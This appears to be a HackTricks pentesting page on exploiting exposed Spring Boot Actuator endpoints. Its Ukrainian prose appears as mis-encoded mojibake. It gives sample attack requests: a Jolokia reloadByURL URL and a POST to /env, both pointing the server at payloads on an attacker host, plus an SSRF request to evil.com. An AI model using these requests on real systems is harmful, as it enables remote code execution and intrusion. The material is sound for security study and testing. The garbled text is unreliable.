# Spring Actuators

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**–ó** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploiting Spring Boot Actuators

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É –ø—É–±–ª—ñ–∫–∞—Ü—ñ—é –∑** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **–ö–ª—é—á–æ–≤—ñ –º–æ–º–µ–Ω—Ç–∏:**

* Spring Boot Actuators —Ä–µ—î—Å—Ç—Ä—É—é—Ç—å –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏, —Ç–∞–∫—ñ —è–∫ `/health`, `/trace`, `/beans`, `/env` —Ç–æ—â–æ. –£ –≤–µ—Ä—Å—ñ—è—Ö –∑ 1 –¥–æ 1.4 —Ü—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ó –≤–µ—Ä—Å—ñ—ó 1.5 —ñ –¥–∞–ª—ñ –ª–∏—à–µ `/health` —ñ `/info` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–µ —î —á—É—Ç–ª–∏–≤–∏–º–∏, –∞–ª–µ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∏ —á–∞—Å—Ç–æ –≤—ñ–¥–∫–ª—é—á–∞—é—Ç—å —Ü—é –±–µ–∑–ø–µ–∫—É.
* –î–µ—è–∫—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ Actuator –º–æ–∂—É—Ç—å —Ä–æ–∑–∫—Ä–∏–≤–∞—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –∞–±–æ –¥–æ–∑–≤–æ–ª—è—Ç–∏ —à–∫—ñ–¥–ª–∏–≤—ñ –¥—ñ—ó:
* `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart` —Ç–∞ `/heapdump`.
* –£ Spring Boot 1.x –∞–∫—Ç—é–∞—Ç–æ—Ä–∏ —Ä–µ—î—Å—Ç—Ä—É—é—Ç—å—Å—è –ø—ñ–¥ –∫–æ—Ä–µ–Ω–µ–≤–æ—é URL, —Ç–æ–¥—ñ —è–∫ —É 2.x –≤–æ–Ω–∏ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –ø—ñ–¥ –±–∞–∑–æ–≤–∏–º —à–ª—è—Ö–æ–º `/actuator/`.

### **–¢–µ—Ö–Ω—ñ–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:**

1. **–í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —á–µ—Ä–µ–∑ '/jolokia'**:
* –ö—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ –∞–∫—Ç–æ—Ä–∞ `/jolokia` –≤—ñ–¥–∫—Ä–∏–≤–∞—î –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É Jolokia, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î HTTP –¥–æ—Å—Ç—É–ø –¥–æ MBeans.
* –î—ñ—é `reloadByURL` –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –¥–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π –∂—É—Ä–Ω–∞–ª—é–≤–∞–Ω–Ω—è –∑ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ URL, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Å–ª—ñ–ø–æ–≥–æ XXE –∞–±–æ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —á–µ—Ä–µ–∑ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω—ñ XML –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó.
* –ü—Ä–∏–∫–ª–∞–¥ URL –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.
2. **–ú–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ '/env'**:
* –Ø–∫—â–æ –ø—Ä–∏—Å—É—Ç–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ Spring Cloud, –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ `/env` –¥–æ–∑–≤–æ–ª—è—î –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—é –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞.
* –í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –º–æ–∂–Ω–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, —Ç–∞–∫–∏—Ö —è–∫ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó XStream —É —Å–ª—É–∂–±—ñ Eureka serviceURL.
*   –ü—Ä–∏–∫–ª–∞–¥ POST –∑–∞–ø–∏—Ç—É –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **–Ü–Ω—à—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è**:
* –í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url` —Ç–∞ `spring.datasource.tomcat.max-active`, –º–æ–∂–Ω–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ SQL-—ñ–Ω'—î–∫—Ü—ñ—è –∞–±–æ –∑–º—ñ–Ω–∞ —Ä—è–¥–∫—ñ–≤ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.

### **–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è:**

* –ü–æ–≤–Ω–∏–π —Å–ø–∏—Å–æ–∫ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö –∞–∫—Ç—é–∞—Ç–æ—Ä—ñ–≤ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt).
* –ö—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ `/env` —É Spring Boot 2.x –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ–æ—Ä–º–∞—Ç JSON –¥–ª—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π, –∞–ª–µ –∑–∞–≥–∞–ª—å–Ω–∞ –∫–æ–Ω—Ü–µ–ø—Ü—ñ—è –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è —Ç–∞–∫–æ—é –∂.

### **–°—Ö–æ–∂—ñ —Ç–µ–º–∏:**

1. **Env + H2 RCE**:
* –î–µ—Ç–∞–ª—ñ –ø—Ä–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ `/env` —Ç–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö H2 –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database).
2. **SSRF –Ω–∞ Spring Boot —á–µ—Ä–µ–∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–µ —Ç–ª—É–º–∞—á–µ–Ω–Ω—è —ñ–º–µ–Ω—ñ —à–ª—è—Ö—É**:
* –û–±—Ä–æ–±–∫–∞ –º–∞—Ç—Ä–∏—á–Ω–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ (`;`) —É HTTP —ñ–º–µ–Ω–∞—Ö —à–ª—è—Ö—ñ–≤ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–æ–º Spring –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è Server-Side Request Forgery (SSRF).
*   –ü—Ä–∏–∫–ª–∞–¥ –∑–∞–ø–∏—Ç—É –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
